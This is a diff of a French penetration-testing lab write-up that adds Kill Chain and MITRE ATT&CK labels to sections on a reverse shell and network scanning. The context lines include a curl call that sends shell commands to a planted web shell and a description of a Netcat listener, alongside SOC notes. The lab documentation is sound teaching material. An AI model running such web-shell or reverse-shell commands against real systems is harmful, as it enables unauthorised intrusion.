@@ -75,7 +75,7 @@ curl -G "http://192.168.50.7/shell.php" --data-urlencode "cmd=for i in \$(seq 1 
 
 ### C. Élévation de l'accès : Le Reverse Shell (MITRE T1059.004)
 
-Plutôt que d'essayer de forcer l'entrée, je vais ordonner au serveur Ubuntu de "sortir" de son réseau pour venir se connecter à ma machine d'attaque. Les pare-feux autorisant presque toujours le trafic sortant par défaut.
+Plutôt que d'essayer de forcer l'entrée, je vais ordonner au serveur Ubuntu de "sortir" de son réseau pour venir se connecter à ma machine d'attaque. Avec ce Reverse Shell j'obtiens ce qu'on appelle dans la *Cyber Kill Chain* le *Command and Control (C2)*, ou le moyen d'executer des commandes dans la machine victime pour atteindre l'*Attack on Objectives*. Les pare-feux autorisant presque toujours le trafic sortant par défaut.
 
 **Étape 1 : Le serveur d'écoute (Kali - Terminal 1)**
 Je configure Netcat pour écouter les connexions entrantes sur le port 4444 :
@@ -110,7 +110,7 @@ Cela me donne un prompt complet et stable pour poursuivre mon intrusion conforta
 > **Contexte SOC & Blue Team (Le NAT Sortant) :**
 > Lors de la connexion du Reverse Shell, Kali affiche : `connect to [192.168.50.5] from (UNKNOWN) [192.168.50.7]`. La connexion semble provenir de l'IP du pare-feu (`.7`) et non du serveur Web (`.11`). C'est l'effet du NAT Sortant (Masquerading) de pfSense. Pour un analyste SOC, cela complexifie l'investigation externe, car la véritable source interne est masquée.
 
-### D. Host Discovery et Port Fingerprinting interactif
+### D. Host Discovery et Port Fingerprinting interactif (Network Service Scanning - MITRE T1046)
 
 Grâce à la stabilité du Reverse Shell, je peux désormais exécuter mon Ping Sweep proprement en tâche de fond (`&`).
 
